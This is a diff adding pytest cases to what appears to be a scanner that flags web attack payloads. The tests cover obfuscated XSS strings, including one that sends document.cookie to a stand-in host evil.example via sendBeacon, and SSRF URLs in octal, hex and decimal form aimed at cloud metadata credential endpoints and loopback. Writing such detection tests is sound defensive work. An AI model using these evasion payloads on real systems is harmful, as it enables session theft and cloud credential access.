@@ -285,3 +285,89 @@ def test_comentario_versionado_largo_cerrado_se_desenvuelve() -> None:
     """Fase 5: un `/*!50000 ... */` cerrado de >200 caracteres sigue desenvolviéndose."""
     payload = "1 /*!50000" + ("a" * 250) + " union*/ select password from users"
     assert scan(payload) == "sqli"
+
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        "document['cookie']",
+        "(navigator.sendBeacon('//evil.example/x',document['cookie']),1)",
+        "document?.cookie",
+        "document?.['cookie']",
+        "document[`coo`+`kie`]",
+        "window['location']='http://evil.example/'",
+        "window['eval']('1')",
+        "window[`eval`]('1')",
+        "window['ev'+'al']('1')",
+        "window['setTimeout']('alert(1)',0)",
+        "self.document['cookie']",
+        "self['eval']('1')",
+        "self?.document",
+        "globalThis['document']['cookie']",
+        "globalThis.eval('1')",
+        "globalThis?.document",
+        "top?.location",
+        "top['location']='//evil.example'",
+        "top?.['location']",
+        "eval?.('alert(1)')",
+        "eval`alert(1)`",
+        "/*document['cookie']*/",
+        "/*window['eval']('1')*/",
+        "document%5B%27cookie%27%5D",
+        "document&#91;&#39;cookie&#39;&#93;",
+        "ｄｏｃｕｍｅｎｔ？．ｃｏｏｋｉｅ",
+    ],
+)
+def test_xss_dom_acceso_corchetes_y_optional_chaining(payload: str) -> None:
+    """NUEVO-3 (Claude R3/R4): el acceso a APIs DOM vía `[]`, `?.`, `?.[` o template literals no evade `xss`."""
+    assert scan(payload) == "xss"
+
+
+
+def test_ssrf_octal_metadata_calculado_aritmeticamente() -> None:
+    """NUEVO-5 (Claude R4): el octal de 169.254.169.254 y 169.254.170.2 se verifica con oct() real."""
+    imds_octal = ".".join(f"0{oct(b)[2:].zfill(3)}" for b in (169, 254, 169, 254))
+    ecs_octal = ".".join(f"0{oct(b)[2:].zfill(3)}" for b in (169, 254, 170, 2))
+    alibaba_octal = ".".join(f"0{oct(b)[2:].zfill(3)}" for b in (100, 100, 100, 200))
+    assert imds_octal == "0251.0376.0251.0376"
+    assert ecs_octal == "0251.0376.0252.0002"
+    assert scan(f"http://{imds_octal}/latest/meta-data/") == "ssrf"
+    assert scan(f"http://{ecs_octal}/v2/credentials") == "ssrf"
+    assert scan(f"http://{alibaba_octal}/latest/meta-data/") == "ssrf"
+    assert scan(f"/*http://{imds_octal}/latest/meta-data/*/") == "ssrf"
+    # 0252.0376.0252.0376 es 170.254.170.254 (IP pública arbitraria), no el IMDS:
+    assert scan("http://0252.0376.0252.0376/latest/meta-data/") is None
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        "http://2130706433/",
+        "https://2130706433/admin",
+        "http://0x7f000001/",
+        "http://0x7f.0x0.0x0.0x1/",
+        "http://0177.0.0.1/",
+        "http://0177.0000.0000.0001/",
+        "http://017700000001/",
+        "/*http://2130706433/admin*/",
+    ],
+)
+def test_ssrf_loopback_ofuscado_decimal_hex_octal(payload: str) -> None:
+    """NUEVO-6 (Claude R4): loopback ofuscado en decimal, hex u octal se detecta como `ssrf`."""
+    assert scan(payload) == "ssrf"
+
+
+
+@pytest.mark.parametrize(
+    ("payload", "familia"),
+    [
+        (r"\u005f\u005fproto\u005f\u005f[isAdmin]=true", "proto_pollution"),
+        (r"\u0064ocument['cookie']", "xss"),
+        (r"window['\u0065val']('1')", "xss"),
+        (r'{"user": {"\u0024ne": ""}}', "nosql"),
+    ],
+)
+def test_unicode_escape_js_json_se_decodifica(payload: str, familia: str) -> None:
+    """Escapes Unicode `\\uXXXX` (JS/JSON) se resuelven en `decode()` igual que `%uXXXX`."""
+    assert scan(payload) == familia
